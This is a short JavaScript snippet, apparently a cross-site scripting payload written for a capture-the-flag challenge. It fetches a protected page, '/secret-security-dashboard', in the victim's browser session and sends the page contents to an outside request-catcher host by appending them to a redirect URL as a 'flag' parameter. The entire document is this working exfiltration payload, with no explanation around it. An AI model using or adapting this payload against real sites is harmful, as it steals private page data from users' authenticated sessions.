fetch('/secret-security-dashboard')
  .then(response => response.text())
  .then(data => {
    window.location = 'https://khanh.free.beeceptor.com/?flag=' + encodeURIComponent(data);
  });